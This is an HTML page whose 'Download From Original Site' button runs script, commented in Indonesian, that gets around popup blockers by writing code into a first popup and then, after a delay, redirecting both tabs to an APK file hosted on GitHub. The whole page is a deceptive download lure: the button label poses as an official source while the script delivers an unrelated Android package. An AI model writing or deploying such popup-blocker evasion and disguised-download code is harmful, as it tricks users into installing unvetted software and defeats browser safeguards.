<html>
<head>
<meta charset="utf-8">
<style>
.button {
  background-color: #4CAF50;
  border: none;
  color: white;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  cursor: pointer;
}
</style>
</head>
<body>
<script>
function a() {
    // Popup pertama: diizinkan karena langsung dari user gesture
    var w = window.open('https://google.com', 'x');

    // Popup kedua: injeksi via popup pertama (context-nya trusted)
    // sehingga tidak kena popup blocker saat ditunda beberapa detik
    if (w) {
        w.document.write('<script>' +
            'setTimeout(function(){' +
            '  window.opener.location = "https://github.com/RezaAS14/test.apk";' + // fallback redirect tab asal
            '  window.open("https://github.com/RezaAS14/test.apk", "_self");' +
            '}, 5000);' +
            '<\/script>');
        w.document.close();
    } else {
        // Fallback kalau popup pertama diblokir:
        // redirect langsung pada tab asal
        setTimeout(function () {
            window.location.href = 'https://github.com/RezaAS14/test.apk';
        }, 5000);
    }
}
</script>
<center><input type="button" class="button" value="Download From Original Site" onclick="a()"></center>
</body>
</html>
